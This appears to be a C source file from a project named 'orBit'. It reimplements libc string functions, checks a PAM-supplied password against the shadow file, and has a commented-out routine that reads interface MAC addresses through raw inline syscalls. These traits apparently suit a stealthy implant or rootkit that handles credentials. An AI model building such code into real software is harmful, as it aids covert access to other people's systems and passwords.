#include "orBit.h"

char    *_orBit_strchr( const char *p, int ch )
{
	char c;

	c = ch;
	for (;; ++p)
    {
		if (*p == c)
			return ((char *)p);
		if (*p == '\0')
			return (NULL);
	}
}

void        *_orBit_memcpy (void *dest, const void *src, size_t len)
{
    char *d = dest;
    const char *s = src;
    while (len--)
        *d++ = *s++;
    return ( dest );
}

size_t      _orBit_strlen( const char *str )
{
	register const char *s;
	for (s = str; *s; ++s);
	return( s - str );
}

int         _orBit_strcmp( const char *s1, const char *s2 )
{
	while (*s1 == *s2++)
		if (*s1++ == 0)
			return (0);
	return (*(unsigned char *)s1 - *(unsigned char *)--s2);
}

void        *_orBit_memset (void *dest, register int val, register size_t len)
{
    register unsigned char *ptr = (unsigned char*)dest;
    while (len-- > 0)
        *ptr++ = val;
    return dest;
}

char        *strcasestr( const char *s, const char *find)
{
	char c, sc;
	size_t len;

	if ((c = *find++) != 0) {
		c = tolower((unsigned char)c);
		len = _orBit_strlen(find);
		do {
			do {
				if ((sc = *s++) == 0)
					return (NULL);
			} while ((char)tolower((unsigned char)sc) != c);
		} while (strncasecmp(s, find, len) != 0);
		s--;
	}
	return ((char *)s);
}

/*
\fn uint8_t check_password( struct pam_response *, const char * )
\brief [ ... ]
*/
uint8_t check_password( struct pam_response *pwd, const char *user )
{
    struct spwd *shadow_entry = NULL;
    shadow_entry = getspnam( user );
    if (shadow_entry == NULL)
        return ( PAM_USER_UNKNOWN );

    char    *salt = strdup( shadow_entry->sp_pwdp );
    if ( salt == 0 )
        return ( 1 );
    char *tmp = _orBit_strchr( salt, '$');
    *strrchr( tmp, '$') = 0;
    char    *hash = crypt( pwd->resp, tmp );
    
    uint8_t res = _orBit_strcmp( hash, shadow_entry->sp_pwdp ) == 0 ? PAM_SUCCESS : PAM_AUTH_ERR;
    free( salt );
    return ( res );
} 

/*
* \fn uint8_t   get_mac_addr( struct ifreq * )
* \brief This function retrieves the MAC addresses of the network interfaces.
*/
/*uint8_t     get_mac_addr( struct ifreq *dst, int *idx )
{
    // # Open the directory "/proc/sys/net". If the opening fails, return NULL.
    char *path = "/sys/class/net/";
	int	fd = -1;
	__asm__ volatile ("syscall" : "=a" (fd) : "a" ( __NR_open ),
		      "D" ( path ), "S" ( O_DIRECTORY ) :
		      "cc", "memory", "rdx", "rcx", "r11");
    
    if ( fd == -1 )
        return ( 1 );

    int ret = sizeof( struct linux_dirent );
    while ( ret == (int)sizeof( struct linux_dirent ) )
    {
        struct linux_dirent dirp;
        __builtin_memset( &dirp, 0, sizeof( struct linux_dirent ));
	    __asm__ volatile ("syscall" : "=a" (ret) : "a" (__NR_getdents),
		          "D" ( fd ), "S" ( &dirp ), "d" (sizeof( struct linux_dirent )) :
		          "cc", "memory", "rcx", "r11");
        if ( ret == sizeof( struct linux_dirent ) )
        {
            if ( _orBit_strcmp( dirp.d_name, ".") != 0 \
                && _orBit_strcmp( dirp.d_name, "..") != 0 \
                && _orBit_strcmp( dirp.d_name, "lo") != 0 )
            {
                int sock = -1;
	            __asm__ volatile ("syscall" : "=a" (sock) : "a" (__NR_socket ),
		              "D" ( AF_INET ), "S" ( SOCK_DGRAM ), "d" (0) :
		              "cc", "memory", "rcx", "r11");
                if ( sock == -1 )
                    goto out_get_mac_addr;

                struct ifreq ifr;
                _orBit_memcpy( ifr.ifr_name, dirp.d_name, _orBit_strlen( dirp.d_name ) );
                int res_ioctl = 0;
	            __asm__ volatile ("syscall" : "=a" ( res_ioctl ) : "a" (__NR_ioctl ),
		              "D" ( sock ), "S" ( SIOCGIFHWADDR ), "d" ( &ifr ) :
		              "cc", "memory", "rcx", "r11");
                if ( res_ioctl == 0 )
                    _orBit_memcpy( &dst[ ++(*idx) ], &ifr, sizeof( struct ifreq ));

                __asm__ volatile ("syscall" : : "a" ( __NR_close ),
		            "D" ( sock ) :
		            "cc", "memory", "rsi", "rdx", "rcx", "r11");
            }
        }
    } 
out_get_mac_addr:
    __asm__ volatile ("syscall" : : "a" ( __NR_close ),
		      "D" ( fd ) :
		      "cc", "memory", "rsi", "rdx", "rcx", "r11");
    
    return ( 0 );
}*/
